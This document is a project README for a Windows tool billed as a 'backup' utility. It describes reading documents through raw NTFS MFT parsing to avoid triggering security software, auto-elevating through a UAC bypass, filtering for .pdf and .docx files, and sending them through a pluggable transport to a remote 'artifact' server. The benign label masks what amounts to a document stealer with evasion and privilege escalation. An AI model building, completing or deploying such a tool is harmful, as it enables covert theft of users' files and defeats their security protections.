# Raw NTFS Document Backup

Windows backup tool that reads files directly from the NTFS Master File Table (MFT), bypassing filesystem APIs. Includes UAC bypass for automatic privilege elevation.

## Features

- Direct NTFS MFT parsing (no filesystem API hooks to trigger security software)
- Handles fragmented files via data run chaining
- Full path reconstruction from MFT parent references
- Configurable file extension filtering
- UAC bypass elevation
- Pluggable transport layer for sending files to backup server

## Requirements

- Windows 10/11 (64-bit)
- Administrator privileges (auto-elevates via UAC bypass)

## Building

# Using vcbuild

```powershell
python .\vcbuild\vcbuild.py
```

## Usage

```powershell
.\ntbackup.exe [server_address:port]
```

# Configuration
```cpp
core::BackupConfig config{
    .targetExtensions = {L".pdf", L".docx"},
    .verbose = true,
    .maxFileSize = 100 * 1024 * 1024
};
```

## Implementing the Transport Layer

The `StubTransport` class is a placeholder. Implement `IFileTransport` interface for file transfer (TCP, gRPC, HTTPS, etc).

```cpp
struct IFileTransport {
    virtual bool Initialize() = 0;
    virtual TransportResult Send(const FileMetadata& metadata,
                                  const std::vector<uint8_t>& data) = 0;
    virtual void Shutdown() = 0;
};
```

Suggested implementations:
- **Raw TCP** with TLV framing
- **gRPC** bidirectional streaming
- **HTTPS POST** to a receiving endpoint
- **WebSocket** with binary frames

## Configuration

Edit `main.cpp` to change:

```cpp
core::BackupConfig config{
    .targetExtensions = {L".pdf", L".docx"},  // File types to backup
    .verbose = true,                           // Log each file
    .maxFileSize = 100 * 1024 * 1024          // Skip files > 100MB
};
```

## How It Works

1. **Volume Access**: Opens raw volume handle (`\\.\C:`) with `GENERIC_READ`
2. **Boot Sector**: Reads NTFS boot sector to find MFT location and cluster size
3. **MFT Parsing**: Walks the Master File Table, parsing each 1024-byte record
4. **Attribute Extraction**: Extracts `$FILE_NAME`, `$STANDARD_INFORMATION`, and `$DATA` attributes
5. **Data Reading**: For non-resident files, follows data runs to read actual file content
6. **Path Reconstruction**: Walks parent directory references to build full paths
7. **Transport**: Sends matching files to configured backup server

For the server component that receives and processes collected artifacts, see [ArtifactProcessingUnit](https://github.com/0xntpower/ArtifactProcessingUnit).